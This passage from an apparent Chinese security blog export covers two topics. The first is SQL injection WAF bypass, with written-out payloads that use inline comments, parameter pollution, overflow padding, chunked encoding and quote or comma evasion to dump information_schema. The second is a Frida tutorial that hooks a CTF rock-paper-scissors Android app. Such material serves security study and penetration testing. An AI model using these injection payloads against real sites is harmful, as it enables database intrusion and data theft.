class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?id<span class="operator">=</span><span class="number">1</span>UNIONSELECT1,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line">index.php?id<span class="operator">=</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">UNION</span><span class="comment">/**/</span>SELECT1,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><h4 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h4><ul><li>相比普通注释，内联注释用的更多，它有一个特性/!**/只有MySQL能识别(/<em>！</em>/表示注释里面的语句会被执行)*</li><li><em>用法：采用/</em>!code*/来执行我们的SQL语句，内联注释可以用于整个SQL语句中</li><li>举例：过滤器过滤了如下内容 这些都是我们内联绕过需要绕过的目标</li><li>•注意：/<em>!50001select</em>fromtest*/的含义：表示假如数据库是5.00.01以上版本，该语句才会被执行</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span>,<span class="keyword">where</span>,table_name,table_schema,<span class="operator">=</span>,andinformation_schema，</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>unionselect1,<span class="number">2</span>,concat(table_name)frominformation_schema.tableswheretable_schema<span class="operator">=</span>database()</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="comment">/*!UnIoN*/</span><span class="operator">+</span><span class="keyword">SeLeCT</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span>,concat(<span class="comment">/*!table_name*/</span>)<span class="operator">+</span><span class="keyword">FrOM</span><span class="comment">/*!information_schema*/</span>.tables<span class="comment">/*!WHERE*/</span><span class="operator">+</span><span class="comment">/*!TaBlE_ScHeMa*/</span><span class="operator">+</span><span class="keyword">like</span><span class="operator">+</span>database()</span><br></pre></td></tr></table></figure><h3 id="5-参数污染："><a href="#5-参数污染：" class="headerlink" title="5.参数污染："></a>5.参数污染：</h3><ul><li><p>HPP(HTTPParameterPolution)又称做重复参数污染，当同一参数出现多次，不同中间件会解析为不同的结果</p></li><li><p>如果WAF只检测了同参数名中的第一个或最后一个，并且中间件特性正好取与WAF相反的参数，则可成功绕过</p></li><li><p>案例：ModSecurity过滤器会将类似于select1,2,3fromtable这类的语句归类为黑名单当web服务器遇到类似/index.aspx?id=select1,2,3fromtable这样的语句时，会阻断请求但是这个web服务器在遇到为同一个参数赋值不同数值时，会将它们连接起来，攻击者通过这个方法来绕过黑名单</p></li></ul> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span> 想要执行的语句：<span class="operator">/</span>index.aspx?id<span class="operator">=</span>select1,<span class="number">2</span>,<span class="number">3</span>fromtable</span><br><span class="line"><span class="operator">*</span> 提交的URL：<span class="operator">/</span>index.aspx?id<span class="operator">=</span>select1<span class="operator">&amp;</span>id<span class="operator">=</span>,<span class="number">2</span>,<span class="number">3</span>fromtable</span><br></pre></td></tr></table></figure><ul><li><p>说明：</p></li><li><p>1、这不属于黑名单中的模式，不会触发黑名单的拦截功能</p></li><li><p>2、由于WEB程序会采取连接操作，即将&amp;符号前后的内容个连接，因此SQL注入行为能够被执行</p></li></ul><h3 id="6-缓冲区溢出："><a href="#6-缓冲区溢出：" class="headerlink" title="6.缓冲区溢出："></a>6.缓冲区溢出：</h3><ul><li><p>缓冲区溢出用于绕过WAF，许多WAF是C语言写的，而C语言自身没有缓冲区保护机制</p></li><li><p>因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过</p></li><li><p>例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="keyword">and</span>(select1)<span class="operator">=</span>(Select0xAAAAAAAAA<span class="operator">*</span><span class="number">1000</span>moreA)<span class="operator">+</span><span class="keyword">UnIoN</span><span class="operator">+</span><span class="keyword">SeLeCT</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span>,version(),<span class="number">4</span>,<span class="number">5</span>,database(),<span class="keyword">user</span>(),<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></li><li><p>说明：示例0xA*1000指0xA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出。</p></li></ul><h3 id="7-整合绕过："><a href="#7-整合绕过：" class="headerlink" title="7.整合绕过："></a>7.整合绕过：</h3><ul><li>整合的意思是结合使用前面的各种绕过技术，单一的技术可能无法绕过过滤机制，但多种技术的配合使用成功的可能性会增加</li><li>多种技术的使用增加了更多的可能性，除非每一种技术单独都无法使用，否则它们能大大增加绕过的成功性</li><li>例如：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="comment">/*!UnIoN*/</span><span class="operator">+</span><span class="keyword">SeLeCT</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span>,concat(<span class="comment">/*!table_name*/</span>)<span class="operator">+</span><span class="keyword">FrOM</span><span class="comment">/*information_schema*/</span>.tables<span class="comment">/*!WHERE*/</span><span class="operator">+</span><span class="comment">/*!TaBlE_ScHeMa*/</span><span class="operator">+</span><span class="keyword">like</span><span class="operator">+</span>database()</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">+</span><span class="comment">/*!UNION*/</span><span class="operator">+</span><span class="comment">/*!SELECT*/</span><span class="operator">+</span><span class="number">1</span>,GrOUp_COnCaT(COLUMN_NAME),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span><span class="comment">/*!INFORMATION_SCHEM*/</span>.COLUMNS<span class="operator">+</span><span class="keyword">WHERE</span><span class="operator">+</span>TABLE_NAME<span class="operator">=</span><span class="number">0x41646d696e</span><span class="comment">--</span></span><br></pre></td></tr></table></figure><h3 id="8-分块传输绕过："><a href="#8-分块传输绕过：" class="headerlink" title="8.分块传输绕过："></a>8.分块传输绕过：</h3><ul><li>当我们将传输的内容分块时，处理后的HTTP请求由于和已知的payload相差较大，所以可以起到一定的绕过WAF的效果</li><li>举例：正常输入id=1and1=2，被安全狗拦住</li><li>举例：使用分块传输，将id=1and1=2进行分块，成功绕过了安全狗•注意：分块传输需要将关键字and,or,select,union等关键字拆开，不然仍然会被waf拦截。编码过程中长度需包括空格的长度。最后用0表示结束，并在0后空两行表示数据包结束</li></ul><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20220118202522075.png" alt="image-20220118202522075"></p><h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><p>Q: 注入过程中where table_schema=”admin” 时候””被过滤</p><ul><li><strong>嵌套子查询语句</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">4</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>十六进制</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x7573657273</span></span><br></pre></td></tr></table></figure><ul><li><strong>assci码</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name<span class="operator">=</span><span class="type">char</span>(<span class="number">104</span>,<span class="number">115</span>,<span class="number">110</span>,<span class="number">112</span>)</span><br></pre></td></tr></table></figure><h3 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h3><ul><li><strong>substr() ,mid() ,limit</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> substr(database(<span class="number">0</span> <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);   <span class="operator">/</span><span class="operator">/</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> mid(database(<span class="number">0</span> <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);      <span class="operator">/</span><span class="operator">/</span><span class="keyword">from</span> <span class="keyword">for</span> 绕过</span><br></pre></td></tr></table></figure><ul><li><strong>limit</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news limit <span class="number">1</span> <span class="keyword">offset</span>  <span class="number">0</span>    <span class="operator">/</span><span class="operator">/</span> <span class="keyword">offset</span> 绕过</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> </span><br></pre></td></tr></table></figure><h3 id="比较符号绕过-lt-gt"><a href="#比较符号绕过-lt-gt" class="headerlink" title="比较符号绕过&lt;&gt;"></a>比较符号绕过&lt;&gt;</h3><ul><li><strong>greatest</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">greatest(ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">64</span>)<span class="operator">=</span><span class="number">64</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Frida 基础</title>
      <link href="/posts/3432/"/>
      <url>/posts/3432/</url>
      
        <content type="html"><![CDATA[<h2 id="APP文件结构"><a href="#APP文件结构" class="headerlink" title="APP文件结构"></a>APP文件结构</h2><p><strong>apk</strong>文件，一种压缩包:</p><p><strong>classes.dex</strong>：编译后的代码<br><strong>AndroidManifest.xml</strong>：重要配置文件，APP启动入口，界面信息等等<br><strong>assets</strong>：资源目录，没被编译    存放本地<strong>证书</strong><br><strong>lib</strong>：so文件, C++开发的动态链接库  so文件有很多系统架构如x86_64,arm64_a, 导致模拟器闪退的原因<br><strong>res</strong>：资源目录，被编译了<br><strong>resources.arsc</strong>：资源文件索引</p><h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><p>用来了解APP的启动加载流程</p><p>package    包名  一般存在在第一行.</p><p>android.intent.action.MAIN  上一行为启动界面</p><p>MainActivty    主界面</p><h3 id="签名证书的使用"><a href="#签名证书的使用" class="headerlink" title="签名证书的使用"></a>签名证书的使用</h3><p>apktool 重打包成apk：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apktool d test.apk  #反编译</span><br><span class="line">apktool b test      #重新打包</span><br></pre></td></tr></table></figure><p>apktool反编译生成出来的是smail文件,可以用jeb可视化源码对比 smail文件来修改源代码,修改完后,在进行重新打包.</p><p>未签名APK不能在安卓手机上安装, APP在启动时会对签名校验：重打包的APP可能需要逆向，跳过校验</p><p><strong>keytool jarsigner</strong>   工具是JAVA JDK自带的<br> 生成证书:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">keytool -genkey -keystore my-release-key.keystore -alias my_alias -keyalg RSA -</span><br><span class="line">keysize <span class="number">4096</span> -validity <span class="number">10000</span></span><br></pre></td></tr></table></figure><p>用证书给apk签名:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jarsigner -sigalg MD5withRSA -digestalg SHA1 -keystore my-release-key.keystore -</span><br><span class="line">signedjar 签名后.apk 签名前.apk my_alias</span><br></pre></td></tr></table></figure><h2 id="插桩技术"><a href="#插桩技术" class="headerlink" title="插桩技术"></a>插桩技术</h2><p>插桩技术是指将额外的代码注入程序中以收集运行时的信息，<strong>可分为两种：</strong></p><p>(1)源代码插桩[Source Code Instrumentation(SCI)]：额外代码注入到程序源代码中。</p><p>(2)二进制插桩（Binary Instrumentation）：额外代码注入到二进制可执行文件中。</p><h3 id="二进制插桩"><a href="#二进制插桩" class="headerlink" title="二进制插桩"></a><strong>二进制插桩</strong></h3><p>●静态二进制插桩[Static Binary Instrumentation(SBI)]：在程序执行前插入额外的代码和数据，生成一个永久改变的可执行文件。</p><p>●动态二进制插桩[Dynamic Binary Instrumentation(DBI)]：在程序运行时实时地插入额外代码和数据，对可执行文件没有任何永久改变。</p><h3 id="实现功能"><a href="#实现功能" class="headerlink" title="实现功能"></a>实现功能</h3><p>（1）访问进程的内存</p><p>（2）在应用程序运行时覆盖一些功能</p><p>（3）从导入的类中调用函数</p><p>（4）在堆上查找对象实例并使用这些对象实例</p><p>（5）Hook，跟踪和拦截函数等等</p><h2 id="frida"><a href="#frida" class="headerlink" title="frida"></a><strong>frida</strong></h2><p>frida是一款基于python + javascript 的hook框架，可运行在android ios linux winosx等各平台，主要使用动态二进制插桩技术。</p><p><strong>HOOK</strong>：在系统没有调用该方法（函数）前，获得该方法（函数)的控制权，从而改写该方法。</p><h3 id="ADB-exe"><a href="#ADB-exe" class="headerlink" title="ADB.exe"></a>ADB.exe</h3><p>Adb常用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">adb shell 进入手机</span><br><span class="line">adb install xxx.apk 安装apk</span><br><span class="line">adb install -r xxx.apk 覆盖安装 </span><br><span class="line">adb uninstall 包名 卸载</span><br><span class="line">adb push 电脑端源文件路径 手机端目标路径 最好把文件放在/sdcard/ 目录下面</span><br><span class="line">adb pull 手机端源文件路径 电脑源文件路径 </span><br><span class="line">adb logcat 查看日志</span><br></pre></td></tr></table></figure><h3 id="frida安装"><a href="#frida安装" class="headerlink" title="frida安装"></a><strong>frida</strong>安装</h3><p>frida框架分为两部分： 一部分是运行在系统上的交互工具frida CLI; 另一部分是运行在目标机器上的代码注入工具 frida-server,手机需要root.</p><p>Python代码作用是控制，写法固定，负责跟frida-server通信，把JS代码传递给frida-serve,Javascript代码作用是Hook操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Frida 常用模块API：</span><br><span class="line"> Java 模块：Hook Java 层的类 方法 相关</span><br><span class="line"> Process 模块：处理当前线程相关</span><br><span class="line"> Interceptor 模块：操作指针相关，多用来Hook Native 相关</span><br><span class="line"> Memory 模块：内存操作相关</span><br><span class="line"> Module 模块：处理so相关</span><br></pre></td></tr></table></figure><p><strong>安装</strong></p><p>1)、下载frida-server 解压 push到手机 增加可执行权限 运行起来,Frida-server. 运行在手机上<br> <a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">getprop ro.product.cpu.abi   #确认手机的系统架构</span><br><span class="line">adb push frida-server /data/local/tmp/    #adb 把执行文件 push到手机</span><br><span class="line">adb shell   #进入shell</span><br><span class="line">su   #root</span><br><span class="line">cd /data/local/tmp</span><br></pre></td></tr></table></figure><p> 确定手机当前用户是root用户或拥有root权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 frida-server</span><br><span class="line">./frida-server&amp;</span><br></pre></td></tr></table></figure><p> 2)、电脑上安装frida</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install frida</span><br></pre></td></tr></table></figure><p> 安装很慢 20分钟<br> <a href="https://pypi.org/project/frida/#files">https://pypi.org/project/frida/#files</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install frida-tools</span><br></pre></td></tr></table></figure><p> 3)、测试安装<br> 电脑上运行<br> frida-ps -U 电脑上运行 android.process.acore 字样表示成功<br> windows运行 端口转发到PC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:27043 tcp:27043#必要时进行端口转发</span><br><span class="line">adb forward tcp:27042 tcp:27042</span><br></pre></td></tr></table></figure><h3 id="HOOk使用"><a href="#HOOk使用" class="headerlink" title="HOOk使用"></a>HOOk使用</h3><p>hook的python代码是固定的:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span>(<span class="params">message, data</span>):</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line">        </span><br><span class="line">test=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Java.perform(</span></span><br><span class="line"><span class="string">    function()&#123;</span></span><br><span class="line"><span class="string">        console.log(&#x27;i am coming&#x27;)   #判断是否已经进来</span></span><br><span class="line"><span class="string">        var MainActivity = Java.use(&#x27;com.example.seccon2015.rock_paper_scissors.MainActivity&#x27;) #类名 绝对路径,直接复制</span></span><br><span class="line"><span class="string">        MainActivity.onClick.implementation = function(v)&#123;</span></span><br><span class="line"><span class="string">            this.onClick(v)</span></span><br><span class="line"><span class="string">            console.log(&#x27;mmm:&#x27;+this.m.value)</span></span><br><span class="line"><span class="string">            console.log(&#x27;nnn:&#x27;+this.n.value)</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        var TT = Java.use(&#x27;com.example.seccon2015.rock_paper_scissors.MainActivity$1&#x27;)</span></span><br><span class="line"><span class="string">        TT.run.implementation = function()&#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            this.this$0.value.m.value = 1</span></span><br><span class="line"><span class="string">            this.this$0.value.n.value = 2</span></span><br><span class="line"><span class="string">            this.run()</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>    </span><br><span class="line"><span class="comment">#两种启动方式</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#attach 进程名 ：APP启动后再hook，不能hook app启动阶段 </span></span><br><span class="line">process = frida.get_usb_device(-<span class="number">1</span>).attach(<span class="string">&#x27;com.example.seccon2015.rock_paper_scissors&#x27;</span>)</span><br><span class="line"><span class="comment">##进程名 也是AndroidManifest.xml 里的包名,可以通过</span></span><br><span class="line">    <span class="comment">##如果找不到可通过 frida-ps -U 来查找进程名.</span></span><br><span class="line">script = process.create_script(test)</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#启动方式2 spawn 重启APP 可以hook APP启动阶段</span></span><br><span class="line"><span class="comment"># device = frida.get_usb_device(-1)</span></span><br><span class="line"><span class="comment"># pid = device.spawn([&#x27;com.example.seccon2015.rock_paper_scissors&#x27;])</span></span><br><span class="line"><span class="comment"># process = device.attach(pid)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># script = process.create_script(test)</span></span><br><span class="line"><span class="comment"># script.on(&#x27;message&#x27;, on_message)</span></span><br><span class="line"><span class="comment"># print(&#x27;[*] Running&#x27;)</span></span><br><span class="line"><span class="comment"># script.load()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># device.resume(pid)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sys.stdin.read()</span></span><br></pre></td></tr></table></figure><p><strong>打印手机所有运行包名</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"></span><br><span class="line">process = frida.get_usb_device().enumerate_processes()</span><br><span class="line"><span class="built_in">print</span>(process)</span><br></pre></td></tr></table></figure><p><strong>两种启动hook方式</strong>：</p><ol><li>attach 进程名 ：APP启动后再hook，不能hook app启动阶段</li><li>spawn ：重启APP，适合hook app 启动阶段</li></ol><p><strong>常用的hook方法:</strong></p><p>java代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.flag != <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.flag = <span class="number">1</span>;</span><br><span class="line">            TextView tv3 = (TextView) findViewById(R.id.textView3);</span><br><span class="line">            tv3.setText(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            TextView tv = (TextView) findViewById(R.id.textView);</span><br><span class="line">            TextView tv2 = (TextView) findViewById(R.id.textView2);</span><br><span class="line">            <span class="keyword">this</span>.m = <span class="number">0</span>;</span><br><span class="line">            Random rm = <span class="keyword">new</span> Random();</span><br><span class="line">            <span class="keyword">this</span>.n = rm.nextInt(<span class="number">3</span>);</span><br><span class="line">            String[] ss = &#123;<span class="string">&quot;CPU: Paper&quot;</span>, <span class="string">&quot;CPU: Rock&quot;</span>, <span class="string">&quot;CPU: Scissors&quot;</span>&#125;;</span><br><span class="line">            tv2.setText(ss[<span class="keyword">this</span>.n]);</span><br><span class="line">            <span class="keyword">if</span> (v == <span class="keyword">this</span>.P) &#123;</span><br><span class="line">                tv.setText(<span class="string">&quot;YOU: Paper&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.m = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (v == <span class="keyword">this</span>.r) &#123;</span><br><span class="line">                tv.setText(<span class="string">&quot;YOU: Rock&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.m = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (v == <span class="keyword">this</span>.S) &#123;</span><br><span class="line">                tv.setText(<span class="string">&quot;YOU: Scissors&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.m = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.handler.postDelayed(<span class="keyword">this</span>.showMessageTask, <span class="number">1000L</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>hook 类方和访问成员变量</strong></p><p>先java.use()一个类名,然后在调用它的方法,从而进行改写.这里用<strong>this.成员变量.value</strong>来访问成员变量.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="comment">//固定的js函数写法</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> activity = Java.use(<span class="string">&#x27;com.example.seccon2015.rock_paper_scissors.MainActivity&#x27;</span>)</span><br><span class="line"><span class="comment">//Java.use 一个类名到变量activity,类名从jadx复制.</span></span><br><span class="line">activity.onClick.implementation = <span class="function"><span class="keyword">function</span>(<span class="params">v</span>)</span>&#123; <span class="comment">//这里调用onClick方法</span></span><br><span class="line">    <span class="built_in">this</span>.onClick(v)<span class="comment">//这里重写方法</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;me:&#x27;</span>+<span class="built_in">this</span>.m.value)<span class="comment">//这里访问成员变量m</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;jj:&#x27;</span>+<span class="built_in">this</span>.n.value)<span class="comment">//这里访问成员变量n</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>hook 匿名类</strong></p><p>java代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    Button P;</span><br><span class="line">    Button S;</span><br><span class="line">    <span class="keyword">int</span> flag;</span><br><span class="line">    <span class="keyword">int</span> m;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    Button r;</span><br><span class="line">    <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Handler handler = <span class="keyword">new</span> Handler(); <span class="comment">//当用final修饰一个类时，表明这个类不能被继承</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Runnable showMessageTask 